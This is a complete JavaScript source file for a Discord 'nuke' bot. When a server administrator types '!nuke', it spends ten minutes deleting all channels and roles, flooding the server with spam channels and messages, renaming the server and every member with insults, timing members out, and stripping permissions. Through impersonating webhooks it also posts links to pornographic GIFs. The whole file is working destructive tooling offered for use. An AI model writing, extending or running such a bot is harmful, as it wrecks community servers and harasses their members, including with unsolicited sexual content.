require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const PROTECTED_CHANNEL = 'aaaaaaaa';

const NUKE_DURATION = 10 * 60 * 1000; // 10 minutes
const TICK_INTERVAL = 7 * 1000;       // faster ticks
let nukeActive = false;
let nukeTimeout = null;
let currentPhase = 1;

// ================== GIF SLOTS ==================
const GIF_TYPE_1 = [
  "https://klipy.com/gifs/orgasm-cumming-1"
];

const GIF_TYPE_2 = [
  "https://klipy.com/gifs/vegan-porn-carrot-porn"
];

// ================== HUGE LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'HALLUCINATION', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
  'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
  'REALITY BROKEN', 'CHAOS OVERLOAD', '10 MIN NUKE', 'TOTAL COLLAPSE',
  'FINAL STAGE', 'NO ESCAPE', 'MINION ARMY', 'PHASE 2', 'PHASE 3',
  'PURE CHAOS', 'MUTE HELL', 'ROLE HELL', 'CHANNEL FLOOD', 'ENDGAME'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead', 'chaos', 'void',
  'pain', 'end', 'lmao', 'gg', 'bot-was-here', 'no-escape', 'server-corpse',
  'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
  'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
  'minion-spam', 'boss-room', 'collapse', 'broken', 'phase-2', 'phase-3',
  'flood', 'spam', 'kill', 'die', 'cry', 'run', 'hide', 'nope', 'end-me'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
  'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
  'SILENCED', 'BROKEN', '10 MIN VICTIM', 'CHAOS SLAVE', 'PHASE VICTIM',
  'ROLELESS', 'LOST', 'HELPLESS', 'TARGET', 'MARKED', 'DOOMED'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion',
  'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Phase 2', 'Phase 3',
  'Doomed', 'Marked', 'Slave', 'Target', 'Broken', 'Flooded'
];

const MESSAGES = [
  '**10 MINUTE NUKE ACTIVE**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
  'OWNED', 'THE END', 'RIP SERVER', 'YOU CANNOT STOP THIS', 'BOT WINS',
  'GOODBYE', 'MINIONS ARE HELPING', 'REALITY IS BREAKING', 'TOO FAST',
  'MUTED', 'SILENCE', '10 MINUTES OF PAIN', 'NO ESCAPE', 'MINION ARMY ONLINE',
  'BOSS IS ANGRY', 'COLLAPSE IMMINENT', 'PHASE CHANGE', 'IT GETS WORSE',
  'CHANNEL FLOOD', 'ROLE HELL', 'MUTE HELL', 'YOU ARE NOTHING'
];

const MINION_NAMES = [
  'Minion', 'Minion-2', 'Chaos Helper', 'Glitch', 'Slave', 'Destroyer',
  'Spammer', 'Mute Bot', 'Pain', 'Void', 'Phase Drone', 'Flood', 'Screamer',
  'Null', 'Error', 'Ghost', 'Hunter', 'Breaker'
];

const MINION_MESSAGES = [
  'minion reporting', 'chaos incoming', 'you are done', 'boss ordered this',
  'no survivors', 'mute activated', 'gif spam', 'reality break', '10 min nuke',
  'help the boss', 'phase shift', 'flooding channels', 'role destruction',
  'silence them', 'break everything', 'no hope left', 'we are many'
];

const PHASE_NAMES = ['PHASE 1: CHAOS', 'PHASE 2: FLOOD', 'PHASE 3: SILENCE', 'PHASE 4: COLLAPSE'];

// ================== HELPERS ==================
function randomItem(arr) {
  if (!arr || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

function chance(percent) {
  return Math.random() * 100 < percent;
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

async function getOrCreateWebhook(channel, name = 'Minion') {
  try {
    const webhooks = await channel.fetchWebhooks();
    let webhook = webhooks.find(wh => wh.name === name);
    if (!webhook) {
      webhook = await channel.createWebhook({
        name: name,
        reason: 'Chaos Minion',
      });
    }
    return webhook;
  } catch (err) {
    return null;
  }
}

async function safeDelete(channel) {
  if (!channel || channel.name === PROTECTED_CHANNEL) return;
  await channel.delete('10 MIN NUKE').catch(() => {});
}

// ================== BOSS ACTIONS (EXPANDED) ==================
const bossActions = [
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
    console.log('🔥 Boss renamed server');
  },

  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    for (const channel of channels) await safeDelete(channel);
    console.log('🗑️ Boss mass deleted channels');
  },

  async (guild) => {
    for (let i = 0; i < 9; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(CHANNEL_NAMES),
          type: ChannelType.GuildText,
        });
        await ch.send(randomItem(MESSAGES)).catch(() => {});
      } catch (e) {}
    }
    console.log('✨ Boss flooded channels');
  },

  async (guild) => {
    for (let i = 0; i < 6; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(['temp', 'flash', 'glitch', 'deleted', 'error', 'null']),
          type: ChannelType.GuildText,
        });
        await ch.send('👁').catch(() => {});
        setTimeout(() => ch.delete().catch(() => {}), 3000 + Math.random() * 5000);
      } catch (e) {}
    }
  },

  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    for (const role of roles) {
      if (role.id === guild.id || !role.editable) continue;
      await role.delete('10 MIN NUKE').catch(() => {});
    }
    console.log('🗑️ Boss deleted roles');
  },

  async (guild) => {
    for (let i = 0; i < 8; i++) {
      await guild.roles.create({
        name: randomItem(ROLE_NAMES),
        color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
        reason: '10 MIN NUKE',
      }).catch(() => {});
    }
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.manageable) continue;
      await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
    }
    console.log('👤 Boss nickname hell');
  },

  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.moderatable) continue;
      const time = [120, 300, 600, 900, 1800, 3600, 7200][Math.floor(Math.random() * 7)] * 1000;
      await member.timeout(time, '10 MIN NUKE - MUTED').catch(() => {});
    }
    console.log('⏳ Boss mute hell');
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    for (const channel of channels.values()) {
      for (let i = 0; i < 6; i++) {
        await channel.send(randomItem(MESSAGES)).catch(() => {});
      }
    }
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    for (const channel of channels.values()) {
      await channel.permissionOverwrites.edit(guild.roles.everyone, {
        ViewChannel: chance(25),
        SendMessages: false,
        Connect: false,
        Speak: false,
        AddReactions: false,
        AttachFiles: false,
      }).catch(() => {});
    }
    console.log('🔐 Boss permission destruction');
  },

  async (guild) => {
    await guild.members.me.setNickname(randomItem([
      '10 MIN NUKE', 'HALLUCINATION', 'MINION BOSS', 'REALITY BREAKER',
      'THE DESTROYER', 'MUTE MASTER', 'CHAOS GOD', 'PHASE CONTROLLER'
    ])).catch(() => {});
  },

  async (guild) => {
    for (let i = 0; i < 4; i++) {
      try {
        const cat = await guild.channels.create({
          name: randomItem(['NUKE ZONE', 'MINION ARMY', 'VOID', 'PAIN', 'FINAL', 'PHASE']),
          type: ChannelType.GuildCategory,
        });
        setTimeout(() => cat.delete().catch(() => {}), 12000 + Math.random() * 15000);
      } catch (e) {}
    }
  },

  // New: Role assign hell
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
    if (!members || roles.length === 0) return;

    for (const member of members.values()) {
      if (member.user.bot || !member.manageable) continue;
      const role = randomItem(roles);
      if (role) await member.roles.add(role).catch(() => {});
    }
    console.log('🎭 Boss role assign hell');
  },
];

// ================== MINION ACTIONS (EXPANDED) ==================
const minionActions = [
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    for (const channel of channels.values()) {
      for (const name of MINION_NAMES.slice(0, 6)) {
        const webhook = await getOrCreateWebhook(channel, name);
        if (!webhook) continue;

        for (let i = 0; i < 4; i++) {
          const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
          if (gif) {
            await webhook.send({ content: gif, username: name }).catch(() => {});
          } else {
            await webhook.send({ content: randomItem(MINION_MESSAGES), username: name }).catch(() => {});
          }
        }
      }
    }
    console.log('👾 Minions heavy GIF spam');
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    for (const channel of channels.values()) {
      const webhook = await getOrCreateWebhook(channel, randomItem(MINION_NAMES));
      if (!webhook) continue;

      for (let i = 0; i < 7; i++) {
        await webhook.send({
          content: randomItem(MINION_MESSAGES),
          username: randomItem(MINION_NAMES),
        }).catch(() => {});
      }
    }
  },

  async (guild) => {
    for (let i = 0; i < 4; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(['minion-spam', 'minion-zone', 'help-boss', 'chaos', 'flood']),
          type: ChannelType.GuildText,
        });
        const webhook = await getOrCreateWebhook(ch, 'Minion');
        if (webhook) {
          for (let j = 0; j < 5; j++) {
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({ content: gif || randomItem(MINION_MESSAGES), username: 'Minion' }).catch(() => {});
          }
        }
      } catch (e) {}
    }
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
    for (const channel of channels.values()) {
      const webhook = await getOrCreateWebhook(channel, 'Glitch');
      if (!webhook) continue;
      await webhook.send({
        content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌']),
        username: 'Glitch',
      }).catch(() => {});
    }
  },

  // New minion: confusion spam
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );

    for (const channel of channels.values()) {
      const webhook = await getOrCreateWebhook(channel, 'Null');
      if (!webhook) continue;
      await webhook.send({
        content: randomItem([
          'ERROR 0x000', 'REALITY.DLL FAILED', 'SYSTEM COLLAPSE',
          'MINION OVERFLOW', 'PHASE SHIFT DETECTED', 'NULL POINTER',
          'YOU ARE NOT SAFE', 'SIGNAL LOST'
        ]),
        username: 'Null',
      }).catch(() => {});
    }
  },
];

// ================== PHASE SYSTEM ==================
function updatePhase(elapsed) {
  if (elapsed < 150000) currentPhase = 1;
  else if (elapsed < 300000) currentPhase = 2;
  else if (elapsed < 450000) currentPhase = 3;
  else currentPhase = 4;
}

// ================== MAIN NUKE TICK ==================
async function runNukeTick(guild, startTime) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
    console.log('⚠️ Missing Administrator permission');
    return;
  }

  const elapsed = Date.now() - startTime;
  updatePhase(elapsed);

  console.log(`\n======== ${PHASE_NAMES[currentPhase - 1]} | Tick on ${guild.name} ========`);

  // More actions in later phases
  const bossCount = currentPhase === 1 ? 7 : currentPhase === 2 ? 9 : currentPhase === 3 ? 10 : 12;
  const minionCount = currentPhase === 1 ? 2 : currentPhase === 2 ? 3 : 4;

  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, bossCount);
  for (const action of selectedBoss) {
    try {
      await action(guild);
      await sleep(90);
    } catch (err) {
      console.error('❌ Boss error:', err.message);
    }
  }

  const selectedMinions = [...minionActions].sort(() => 0.5 - Math.random()).slice(0, minionCount);
  for (const action of selectedMinions) {
    try {
      await action(guild);
      await sleep(80);
    } catch (err) {
      console.error('❌ Minion error:', err.message);
    }
  }
}

// ================== START / STOP ==================
async function startNuke(guild, message) {
  if (nukeActive) {
    if (message) await message.reply('⚠️ Nuke is already running.');
    return;
  }

  nukeActive = true;
  currentPhase = 1;
  const startTime = Date.now();

  if (message) {
    await message.reply('💣 **10 MINUTE EXTREME NUKE STARTED**\nPhases will escalate.\nMinions + Boss are online.');
  }

  console.log('💣 10 MINUTE EXTREME NUKE SESSION STARTED');

  await runNukeTick(guild, startTime);

  const interval = setInterval(async () => {
    if (!nukeActive) {
      clearInterval(interval);
      return;
    }
    await runNukeTick(guild, startTime);
  }, TICK_INTERVAL);

  nukeTimeout = setTimeout(() => {
    nukeActive = false;
    clearInterval(interval);
    console.log('🛑 10 MINUTE NUKE SESSION ENDED');
  }, NUKE_DURATION);
}

// ================== EVENTS ==================
client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 EXTREME 10 MIN NUKE BOT READY`);
  console.log(`Protected channel: ${PROTECTED_CHANNEL}`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!nuke') {
    await startNuke(message.guild, message);
  }

  if (message.content === '!nuke-stop') {
    nukeActive = false;
    if (nukeTimeout) clearTimeout(nukeTimeout);
    await message.reply('🛑 Nuke session force stopped.');
    console.log('🛑 Nuke force stopped');
  }

  if (message.content === '!phase') {
    await message.reply(`Current Phase: **${PHASE_NAMES[currentPhase - 1] || 'IDLE'}**`);
  }
});

client.login(TOKEN);
